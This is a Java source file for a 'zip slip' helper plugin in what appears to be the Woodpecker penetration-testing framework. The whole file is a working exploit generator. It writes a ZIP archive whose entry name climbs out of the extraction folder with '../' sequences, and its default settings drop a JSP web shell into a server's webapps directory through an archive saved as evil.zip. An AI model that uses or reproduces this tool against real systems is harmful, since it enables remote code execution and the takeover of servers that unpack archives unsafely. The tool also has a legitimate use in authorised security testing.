package me.gv7.woodpecker.plugin;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.zip.Deflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ZipSlip implements IHelper{
    public String getHelperTabCaption() {
        return "zip slip";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = ZipTools.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = ZipTools.pluginHelper.createArg();
        args1.setName("compress_file");
        args1.setDefaultValue("/tmp/shell.jsp");
        args1.setDescription("要压缩的目标");
        args1.setRequired(true);
        args.add(args1);


        IArg uncompressTo = ZipTools.pluginHelper.createArg();
        uncompressTo.setName("uncompress_to");
        uncompressTo.setDefaultValue("../../../webapps/shell.jsp");
        uncompressTo.setDescription("解压的路径");
        uncompressTo.setRequired(true);
        args.add(uncompressTo);


        IArg saveFile = ZipTools.pluginHelper.createArg();
        saveFile.setName("save_file");
        saveFile.setDefaultValue("/tmp/evil.zip");
        saveFile.setDescription("生成文件的保存路径");
        saveFile.setRequired(true);
        args.add(saveFile);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public static void generateEvilZip(String compressFile,String uncompressTo,String saveFile) throws Exception{
        ZipOutputStream zipOutputStream = new ZipOutputStream(new FileOutputStream(saveFile));
        zipOutputStream.setLevel(Deflater.BEST_COMPRESSION);
        byte[] buffer = new byte[512];
        zipOutputStream.putNextEntry(new ZipEntry(uncompressTo));
        InputStream inputStream = new FileInputStream(compressFile);
        int readLen;
        while ((readLen = inputStream.read(buffer)) != -1) {
            zipOutputStream.write(buffer, 0, readLen);
        }
        inputStream.close();
        zipOutputStream.close();
    }


    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String compressFile = (String)customArgs.get("compress_file");
        String uncompressTo = (String)customArgs.get("uncompress_to");
        String saveFile = (String)customArgs.get("save_file");
        resultOutput.infoPrintln(String.format("Compress %s to %s",compressFile,uncompressTo));
        generateEvilZip(compressFile,uncompressTo,saveFile);
        resultOutput.successPrintln(String.format("Save file %s success!",saveFile));
    }
}
